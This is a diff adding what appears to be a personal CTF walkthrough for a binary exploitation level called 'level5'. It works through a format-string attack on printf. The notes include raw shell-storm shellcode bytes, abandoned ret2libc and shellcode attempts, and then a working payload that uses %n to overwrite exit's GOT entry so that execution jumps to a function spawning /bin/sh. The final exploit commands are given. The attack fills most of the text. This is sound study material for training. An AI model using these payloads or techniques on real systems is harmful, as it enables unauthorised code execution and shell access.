@@ -1,0 +1,88 @@
+In this one there is no compare or anything, just printf then exit
+The call to 'exit@plt' is 'call 0x80483d0', so we might just override this address with a shellcode address (in the buffer) and it should work
+Or we can even try a ret2libc since it seems easier, by replacing it with address of system and giving as arg the address of "/bin/sh"
+
+
+System address: 0x80483b0 (in decimal 134513584)
+but 'find __libc_start_main,+999999999,"/bin/sh"' doesn't find anything, so we'll have to input the "/bin/sh" string into the buffer by hand
+
+And it's harder to to 2 %n (one for system address and the other for "/bin/sh" pointer), so just use shellcode instead
+
+
+It should look like this:
+[ shellcode ptr ] [ shellcode ] [ <shellcode ptr> - 4 characters - (number of %p after / 2) ] [ %p padding to get rid of unwanted stack values ] [ %n ] [ shellcode ]
+
+Shellcode (https://shell-storm.org/shellcode/files/shellcode-219.html) : "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+
+
+[ Buffer + 4 ] [ shellcode ] [ padding to get <buffer + 4> chars ] [ %n ]
+
+Buffer starts at 0xbffff4f0, so:
+
+[ 0xbffff4f4 (3221222644) ] [ shellcode (len is 55 without NULL terminator) ] [ padding so that 0xbffff4f4 is on top of the stack ] [ "%n" ]
+
+We need to print 3221222644 - 4 - 55 - len(padding) chars before %n
+
+but 3221222644 is too big for printf precision (I suppose it's because it's bigger than INT MAX), so divide by 2 = 1610611322
+on the VM, the max seems to be around 1 Billion
+So we need to print 3 times 1000000000 + 221222644
+
+Ok so update, this address in the billions seems way to big for printf to handle printing it (always returns -1)
+so we'll to replace the jmp in exit@plt (address 0x080483d0) to jmp to the shellcode, this should work
+
+
+
+
+
+
+
+In this one there is no compare or anything, just printf then exit
+There is also the function 'o' which isn't called anywhere, but call system("/bin/sh"), so the goal is to call function o
+
+Im dumb, we dont need shellcode or anything, just replace the jmp in exit to jmp to function 'o' and gg
+
+[ 0x080483d2 ] [ padding ] [ %n ]
+
+address of o : 0x080484a4 (134513828 as decimal)
+
+"\xd2\x83\x04\x08" + "%.134513816d" + "%x"*2 + "%n"
+
+printing %x 2 times (in addition to the first %d) makes the buffer on top of stack (so with %n it will pop and since first value in buffer is address it's ok)
+First we try without the %n and check eax, it needs to be equal 0x080484a4 so add / remove things until it is
+
+correct value is '%.134513807d'
+
+
+so buffer should be : "\xd2\x83\x04\x08" + "%.134513807d" + "%x"*2 + "%n"
+
+exit@plt dereferences address given and jumps to the value it finds, so we also need to push o addres into buffer
+then pass as jmp argument to exit the pointer to o's address inside the buffer: 
+ [ jmp address ]       [ ptr to o ]           [     padding     ]   [ %n ]
+"\xd2\x83\x04\x08" + "\xa4\x84\x04\x08" + "%.134513807d" + "%x"*1' + "%n"
+
+But as before, we cannot use stack address with %n (too big), but fortunately there is another jmp in exit@plt, which doesn't dereference (at address)
+But this is the point of PLT, this address is loaded by the system at runtime (we can see that 0x80483dd contains 0xffffffff for system to load)
+
+Another solution might be to override the dereferenced address instead of the pointer, so we need to put 'o' pointer at address 0x8049838
+0x8049838
+
+   [ deref jmp ]    [       padding       ]    
+'"\x38\x98\x04\x08" + "%.134513807d" + "%x"*2 + "%n"'
+
+So it writes successfully to the address, and I noticed that the number was offset by 1, maybe the null is not counted or idk, anyway i just added 1
+"\x38\x98\x04\x08" + "%.134513808d" + "%x"*2 + "%n"
+
+And on the breakpoint after printf, I check what is at the address 0x08049838, and it's 0x080484a4, so we sucessfully replaced the exit pointer with 'o' pointer
+
+If we just step, we sucessfully enter the function o
+
+in gdb:
+run < <(python -c 'print "\x38\x98\x04\x08" + "%.134513808d" + "%x"*2 + "%n"'; cat)
+We need to wait for it to print the 134 million zeroes (otherwise we cannot se shell output), but it works in gdb :)
+And since we don't use any stack values (except padding), it should work outside gdb aswell without modification
+
+final command: (also in exploit.py):
+(python -c 'print "\x38\x98\x04\x08" + "%.134513808d" + "%x"*2 + "%n"' ; cat) | ./level5
+OR
+(python exploit.py ; cat) | ./level5
